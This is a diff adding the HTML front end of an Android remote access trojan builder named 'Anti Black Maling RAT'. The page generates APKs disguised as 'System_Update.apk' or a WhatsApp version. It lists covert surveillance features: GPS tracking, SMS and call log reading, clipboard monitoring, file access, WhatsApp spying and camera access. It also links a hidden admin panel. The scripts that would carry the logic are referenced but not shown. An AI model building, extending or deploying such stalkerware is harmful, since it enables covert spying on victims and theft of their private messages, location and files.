@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Anti Black Maling RAT</title>
+    <link rel="stylesheet" href="style.css">
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+</head>
+<body>
+
+    <div class="main-container">
+        <header>
+            <h1>Anti Black Maling RAT</h1>
+            <p class="dev-name">Developer: Nawab Zada Hacker ✌️ 🦅 🙌</p>
+        </header>
+
+        <!-- APK Generator Section -->
+        <div class="card" id="generator-section">
+            <h2>📱 APK Generator</h2>
+            <div class="input-group">
+                <label for="apkName">Enter APK Name:</label>
+                <input type="text" id="apkName" placeholder="e.g., WhatsApp_V8.apk" value="System_Update.apk">
+            </div>
+            
+            <button id="generateBtn" onclick="app.generateAPK()">⚡ Generate & Download</button>
+            
+            <div id="statusMessage" class="status"></div>
+        </div>
+
+        <!-- Features List -->
+        <div class="card">
+            <h3>🔥 Full Control Features</h3>
+            <ul class="feature-list">
+                <li>📍 Real-time GPS Location</li>
+                <li>🔋 Battery & Charging Status</li>
+                <li>📞 Call Logs & SMS Reader</li>
+                <li>📋 Clipboard Monitor</li>
+                <li>🖼️ Gallery & File Manager</li>
+                <li>💬 WhatsApp Message Spy</li>
+                <li>🎥 Camera (Front/Rear) Access</li>
+            </ul>
+        </div>
+
+        <!-- Hidden Admin Link -->
+        <a href="admin.html" class="admin-link">⚙️ Admin Panel</a>
+    </div>
+
+    <!-- Main Logic Script -->
+    <script src="firebase-config.js"></script>
+    <script src="app.js"></script>
+</body>
+</html>
